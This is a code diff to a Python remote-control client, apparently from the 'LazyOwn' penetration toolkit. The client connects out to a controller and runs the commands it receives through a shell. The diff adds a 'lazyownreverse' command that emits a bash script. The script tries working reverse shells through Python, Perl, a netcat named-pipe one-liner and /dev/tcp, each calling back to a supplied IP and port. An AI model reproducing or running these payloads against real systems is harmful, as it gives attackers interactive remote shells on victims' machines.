@@ -71,21 +71,101 @@ def handle_command(cmd, key):
         info += f'Processor: {platform.processor()}\n'
         return info
 
-    elif cmd == 'fix_xauth':
-        try:
-            os.system("touch ~/.Xauthority")
-            os.system("xauth generate :0 . trusted")
-            os.system("xauth add :0 . $(xxd -l 16 -p /dev/urandom)")
-            os.environ['DISPLAY'] = ':0'
-            return "Xauthority file created and DISPLAY set."
-        except Exception as e:
-            return f"Error fixing Xauthority: {e}"
+    elif cmd.startswith('lazyownreverse'):
+        _, ip, port = cmd.split(' ')
+        script_content = f"""#!/bin/bash
+
+echo "██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗"
+echo "██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║"
+echo "██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║"
+echo "██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║"
+echo "███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║"
+echo "╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝"
+
+function mostrar_ayuda {{
+    echo "Uso: $0 --ip IP --puerto PUERTO"
+    echo ""
+    echo "Opciones:"
+    echo "  --ip       IP del servidor de escucha"
+    echo "  --puerto   Puerto del servidor de escucha"
+    exit 1
+}}
+
+function validar_ip {{
+    local ip=$1
+    local valid_regex='^([0-9]{1,3}\\.){{3}}[0-9]{1,3}$'
+    if [[ $ip =~ $valid_regex ]]; then
+        for segment in $(echo $ip | tr "." "\\n"); do
+            if ((segment < 0 || segment > 255)); then
+                return 1
+            fi
+        done
+        return 0
+    else
+        return 1
+    fi
+}}
+
+if [[ $# -lt 4 ]]; then
+    mostrar_ayuda
+fi
+
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        --ip)
+            IP="$2"
+            if ! validar_ip "$IP"; then
+                echo "[-] IP inválida: $IP"
+                exit 1
+            fi
+            shift 2
+            ;;
+        --puerto)
+            PUERTO="$2"
+            if ! [[ $PUERTO =~ ^[0-9]+$ ]] || (( PUERTO < 1 || PUERTO > 65535 )); then
+                echo "[-] Puerto inválido: $PUERTO"
+                exit 1
+            fi
+            shift 2
+            ;;
+        *)
+            mostrar_ayuda
+            ;;
+    esac
+done
+
+echo "[+] Intentando reverse shell en Python..."
+if command -v python > /dev/null 2>&1; then
+    echo "[*] Ejecutando Reverse Shell en python"
+    python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$IP',$PUERTO)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/sh','-i']);" && exit
+fi
+
+echo "[+] Intentando reverse shell en Perl..."
+if command -v perl > /dev/null 2>&1; then
+    echo "[*] Ejecutando Reverse Shell en perl"
+    perl -e 'use Socket;$i="$IP";$p=$PUERTO;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' && exit
+fi
+
+echo "[+] Intentando reverse shell en Netcat..."
+if command -v nc > /dev/null 2>&1; then
+    echo "[*] Ejecutando Reverse Shell en nc"
+    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PUERTO > /tmp/f && exit
+fi
+
+echo "[+] Intentando reverse shell en Shell..."
+if command -v sh > /dev/null 2>&1; then
+    echo "[*] Ejecutando Reverse Shell en sh"
+    /bin/sh -i >& /dev/tcp/$IP/$PUERTO 0>&1 && exit
+fi
+
+echo "[-] No se pudo establecer una conexión reverse shell con ninguna de las herramientas disponibles."
+"""
+        return script_content
 
     else:
         return subprocess.check_output(cmd, shell=True)
 
 def main():
-    # Banner de la herramienta
     BANNER = """
     ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
     ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
@@ -108,7 +188,7 @@ def main():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
-    print(f'[+] Connected to {HOST}:{PORT}')
+    print(f'[x] Conectado a {HOST}:{PORT}')
 
     try:
         while True:
